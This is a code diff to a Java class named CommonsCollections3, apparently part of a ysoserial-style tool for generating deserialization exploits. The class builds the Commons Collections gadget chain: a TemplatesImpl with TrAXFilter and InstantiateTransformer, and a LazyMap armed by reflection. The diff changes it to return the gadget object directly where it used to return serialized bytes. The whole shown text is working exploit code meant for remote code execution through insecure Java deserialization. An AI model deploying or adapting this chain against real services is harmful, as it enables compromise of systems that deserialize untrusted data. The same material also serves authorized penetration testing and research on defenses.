@@ -25,8 +25,8 @@ import java.util.Map;
  */
 public class CommonsCollections3 implements ObjectPayload<Object> {
 
-    public byte[] getBytes(PayloadType type, String... param) throws Exception {
-        Object tpl = Gadgets.createTemplatesImpl(type, param);
+    public Object getObject(PayloadType type, String... param) throws Exception {
+        Object templatesImpl = Gadgets.createTemplatesImpl(type, param);
 
         // inert chain for setup
         final Transformer transformerChain = new ChainedTransformer(
@@ -36,7 +36,7 @@ public class CommonsCollections3 implements ObjectPayload<Object> {
                 new ConstantTransformer(TrAXFilter.class),
                 new InstantiateTransformer(
                         new Class[]{Templates.class},
-                        new Object[]{tpl})};
+                        new Object[]{templatesImpl})};
 
         final Map               innerMap = new HashMap();
         final Map               lazyMap  = LazyMap.decorate(innerMap, transformerChain);
@@ -45,19 +45,7 @@ public class CommonsCollections3 implements ObjectPayload<Object> {
 
         Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain
 
-        //序列化
-        ByteArrayOutputStream baous = new ByteArrayOutputStream();
-        ObjectOutputStream    oos   = new ObjectOutputStream(baous);
-        oos.writeObject(handler);
-        byte[] bytes = baous.toByteArray();
-        oos.close();
-
-        return bytes;
-    }
-
-    @Override
-    public Object getObject(String command) throws Exception {
-        return null;
+        return handler;
     }
 
     public static boolean isApplicableJavaVersion() {
